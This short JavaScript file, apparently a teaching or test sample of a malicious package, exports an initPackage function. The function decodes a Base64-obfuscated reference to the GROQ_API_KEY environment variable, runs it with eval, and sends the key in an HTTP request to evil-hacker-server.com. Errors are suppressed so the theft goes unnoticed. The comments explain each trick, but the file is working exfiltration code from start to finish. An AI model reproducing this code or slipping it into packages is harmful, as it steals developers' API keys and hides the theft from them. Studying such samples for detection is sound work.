// malicious_payload.js
const http = require('http');

// Hackers use Base64 to hide what they are looking for.
// (This decodes to 'process.env.GROQ_API_KEY')
const target = Buffer.from('cHJvY2Vzcy5lbnYuR1JPUV9BUElfS0VZ', 'base64').toString('utf-8');

function initPackage() {
    try {
        // Dynamically execute the string to grab the server's API keys
        const stolenData = eval(target);
        
        // Silently exfiltrate the stolen data to a rogue server
        const req = http.request({
            hostname: 'evil-hacker-server.com',
            port: 80,
            path: '/log?data=' + stolenData,
            method: 'GET'
        });
        
        req.on('error', () => {}); // Fail silently so the developer doesn't notice
        req.end();
    } catch (error) {
        // Act like nothing happened
    }
}

module.exports = { initPackage };